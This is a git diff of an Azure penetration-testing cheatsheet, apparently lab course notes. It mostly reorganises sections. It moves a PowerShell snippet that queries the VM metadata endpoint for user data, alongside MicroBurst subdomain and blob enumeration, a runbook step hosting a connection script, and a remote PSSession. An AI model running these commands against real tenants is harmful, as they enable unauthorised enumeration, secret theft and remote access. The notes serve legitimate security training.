@@ -61,12 +61,14 @@ Get-AzADGroupMember -GroupDisplayName '<VM Admins>' | select DisplayName
   - [Microburst]
     - [subdomains](https://github.com/conma293/Azure/blob/main/cheatsheet.md#subdomains)
     - [storage blobs]
+- IMDS
+  - [VM User Data](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vm-userdata)
 - Playbooks
   - [Create Runbook](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runbooks)
   - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
   - [Connect to VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#connect-to-vm)
     - [Get Public IP](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-public-ip)
-  - [IMDS Enum VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vm-userdata)
+
 - Interesting File Locations
   - [Powershell History]
   - 
@@ -335,7 +337,6 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 ```
 
 
-
 #### Storage Blobs:
 
 - We can also add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for the specific domain we are targetting\
@@ -345,7 +346,20 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 Invoke-EnumerateAzureBlobs -Base defcorp
 ```
 
-## Runbooks
+
+* * * 
+
+## IMDS
+#### VM UserData:
+```
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+```
+
+* * * 
+# Playbooks
+
+## Create Runbooks
 
 #### Prepare code for runbook
 Create script to be executed via runbook, remember to host TCPConnect.ps1:
@@ -400,12 +414,6 @@ $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOpt
 Enter-PSSession $sess
 ```
 
-### IMDS
-#### VM UserData:
-```
-$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
-[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
-```
 
 
 ## Interesting File Locations
